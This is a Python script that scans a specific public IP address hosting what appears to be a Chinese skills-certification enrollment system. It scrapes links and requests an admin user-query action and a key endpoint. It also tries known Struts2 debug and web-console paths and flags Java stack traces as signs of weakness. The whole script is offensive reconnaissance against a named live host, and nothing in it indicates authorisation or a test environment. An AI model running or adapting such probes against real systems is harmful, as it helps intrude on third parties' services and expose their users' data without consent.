import urllib.request
import urllib.error
import re

proxy_handler = urllib.request.ProxyHandler({})
opener = urllib.request.build_opener(proxy_handler)

def fetch_url(url):
    try:
        req = urllib.request.Request(url)
        req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        resp = opener.open(req, timeout=10)
        status = resp.status
        headers = dict(resp.headers.items())
        try:
            body = resp.read().decode('gbk', errors='replace')
        except:
            body = resp.read().decode('utf-8', errors='replace')
        return status, headers, body
    except urllib.error.HTTPError as e:
        status = e.code
        headers = dict(e.headers.items())
        try:
            body = e.read().decode('gbk', errors='replace')
        except:
            body = e.read().decode('utf-8', errors='replace')
        return status, headers, body
    except Exception as e:
        return None, None, str(e)

print("=" * 60)
print("Step 1: 获取主页内容，查找相关系统入口")
print("=" * 60)
status, headers, body = fetch_url('http://124.128.231.226/')
print(f"Status: {status}")
if body:
    title_match = re.search(r'<title>(.*?)</title>', body, re.IGNORECASE | re.DOTALL)
    if title_match:
        print(f"Page title: {title_match.group(1)}")
    
    links = re.findall(r'href=["\'](.*?)["\']', body, re.IGNORECASE)
    print(f"\nTotal links found: {len(links)}")
    
    keywords = ['sdosta', 'sdskb', 'enroll', 'baoming', 'jineng', 'skill', '8888', '报名', '技能', '认定']
    relevant_links = []
    for link in links:
        for kw in keywords:
            if kw.lower() in link.lower():
                relevant_links.append(link)
                break
    print(f"\nRelevant links ({len(relevant_links)}):")
    for link in relevant_links:
        print(f"  {link}")
    
    port_refs = re.findall(r'124\.128\.231\.226:8888[^"\'\s]*', body)
    print(f"\nReferences to port 8888 ({len(port_refs)}):")
    for ref in port_refs:
        print(f"  {ref}")

print("\n" + "=" * 60)
print("Step 2: 测试8888端口的各种路径")
print("=" * 60)

paths_to_test = [
    '/web/Index.action',
    '/web//getTopLinksPortalCategoriesAction.action?siteId=test',
    '/web//mep-admin/userAction!queryUser.action?start=0&limit=10',
    '/sdostanet/sdosta/netEnroll/netLogin/logout',
    '/sdostanet/',
    '/sdskb',
    '/sdskb/',
    '/sdostair/',
    '/sdostair/search/getPubKey',
]

for path in paths_to_test:
    url = f'http://124.128.231.226:8888{path}'
    status, headers, body = fetch_url(url)
    print(f"\nURL: {url}")
    print(f"Status: {status}")
    if headers:
        server = headers.get('Server', 'N/A')
        print(f"Server: {server}")
        content_type = headers.get('Content-Type', 'N/A')
        print(f"Content-Type: {content_type}")
    if body and len(body) > 0:
        print(f"Body length: {len(body)}")
        # 检查是否有Java错误信息
        java_keywords = ['java.lang', 'Exception', 'StackTrace', 'Struts', 'struts2', 'Servlet', 'JSP', 'nullpointer', 'NullPointer']
        found_java = False
        for kw in java_keywords:
            if kw.lower() in body.lower():
                found_java = True
                print(f"  [JAVA ERROR] Found keyword: {kw}")
        if found_java:
            print(f"Body preview:\n{body[:2000]}")
        else:
            print(f"Body preview: {body[:300]}")
    else:
        print("Body: empty")

print("\n" + "=" * 60)
print("Step 3: 测试Struts2常见漏洞路径")
print("=" * 60)

struts_paths = [
    '/struts/webconsole.html',
    '/Struts2.action?debug=xml',
    '/Index.action?debug=browser',
    '/index.action',
    '/login.action',
    '/user.action',
]

for path in struts_paths:
    for base in ['http://124.128.231.226:8888', 'http://124.128.231.226']:
        url = f'{base}{path}'
        status, headers, body = fetch_url(url)
        if status and status != 404:
            print(f"\nURL: {url}")
            print(f"Status: {status}")
            if body:
                java_keywords = ['java.lang', 'Exception', 'StackTrace', 'Struts', 'struts2', 'Servlet']
                for kw in java_keywords:
                    if kw.lower() in body.lower():
                        print(f"  [JAVA ERROR] Found keyword: {kw}")
                print(f"Body preview: {body[:300]}")

print("\n" + "=" * 60)
print("验证完成")
print("=" * 60)
